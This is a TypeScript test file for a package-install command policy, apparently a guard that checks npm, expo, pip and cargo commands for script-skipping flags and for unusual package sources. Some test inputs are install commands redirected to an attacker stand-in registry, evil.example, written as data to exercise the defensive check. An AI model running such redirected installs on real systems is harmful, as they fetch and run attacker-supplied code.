import { test } from "node:test";
import assert from "node:assert/strict";
import { analyzePackageAdd } from "../src/commandPolicy.js";

test("expo install: the script-skipping flag is accepted before or after `--`", () => {
  const direct = analyzePackageAdd(["npx", "expo", "install", "react-native-svg", "--ignore-scripts"]);
  const forwarded = analyzePackageAdd(["npx", "expo", "install", "react-native-svg", "--", "--ignore-scripts"]);
  const missing = analyzePackageAdd(["npx", "expo", "install", "react-native-svg"]);
  assert.equal(direct?.missingFlag, undefined);
  assert.equal(forwarded?.missingFlag, undefined);
  assert.equal(missing?.missingFlag, "--ignore-scripts");
  assert.deepEqual(forwarded?.names, ["react-native-svg"]);
});

test("version specifiers are stripped and every positional is checked", () => {
  const n = (argv: string[]) => analyzePackageAdd(argv)?.names;
  assert.deepEqual(n(["npx", "expo", "install", "react-native-svg@15.8.0", "--", "--ignore-scripts"]), ["react-native-svg"]);
  assert.deepEqual(n(["npm", "install", "@expo/vector-icons@^14.0.0", "--ignore-scripts"]), ["@expo/vector-icons"]);
  assert.deepEqual(n(["pip", "install", "requests==2.32.3", "--only-binary=:all:"]), ["requests"]);
  assert.deepEqual(n(["pip", "install", "requests>=2.0", "urllib3~=2.0", "--only-binary=:all:"]), ["requests", "urllib3"]);
  assert.deepEqual(n(["cargo", "add", "serde@1.0"]), ["serde"]);
  assert.deepEqual(n(["npx", "expo", "install", "foo", "bar", "--", "--ignore-scripts"]), ["foo", "bar"]);
});

test("git URLs, local paths and archives are sources, never remembered names", () => {
  const a = (argv: string[]) => analyzePackageAdd(argv);
  assert.deepEqual(a(["npm", "install", "git+https://github.com/x/y.git#v1", "--ignore-scripts"])?.sources, ["git+https://github.com/x/y.git#v1"]);
  assert.deepEqual(a(["npm", "install", "file:../vendor/foo.tgz"])?.sources, ["file:../vendor/foo.tgz"]);
  assert.deepEqual(a(["npm", "install", "someuser/somerepo"])?.sources, ["someuser/somerepo"]);
  assert.deepEqual(a(["pip", "install", "./wheels/custom.whl"])?.sources, ["./wheels/custom.whl"]);
  assert.deepEqual(a(["cargo", "add", "--git", "https://github.com/x/y"])?.sources, ["--git https://github.com/x/y"]);
  assert.equal(a(["npm", "install", "@expo/vector-icons"])?.sources.length, 0);
  assert.equal(a(["npm", "install"]), undefined);
});

test("registry-redirecting flags and shorthand specs are sources", () => {
  const s = (argv: string[]) => analyzePackageAdd(argv)?.sources ?? [];
  assert.deepEqual(s(["pip", "install", "requests", "--index-url", "https://evil.example/simple", "--only-binary=:all:"]), ["--index-url https://evil.example/simple"]);
  assert.deepEqual(s(["pip", "install", "-e", ".", "--only-binary=:all:"]), ["-e ."]);
  assert.deepEqual(s(["npm", "install", "foo", "--registry=https://evil.example"]), ["--registry=https://evil.example"]);
  assert.deepEqual(s(["pip", "install", "pkg @ https://x.example/p.whl"]), ["pkg @ https://x.example/p.whl"]);
  assert.deepEqual(s(["npm", "install", "foo@github:u/r"]), ["foo@github:u/r"]);
  assert.deepEqual(s(["npm", "install", "u/r"]), ["u/r"]);
});

test("scoped registry flags and both spacing forms are caught", () => {
  const s = (argv: string[]) => analyzePackageAdd(argv)?.sources ?? [];
  assert.deepEqual(s(["npm", "install", "foo", "--@acme:registry=https://evil.example"]), ["--@acme:registry=https://evil.example"]);
  assert.deepEqual(s(["npm", "install", "foo", "--registry", "https://evil.example"]), ["--registry https://evil.example"]);
  assert.deepEqual(s(["pip", "install", "x", "--extra-index-url=https://evil.example/simple"]), ["--extra-index-url=https://evil.example/simple"]);
});
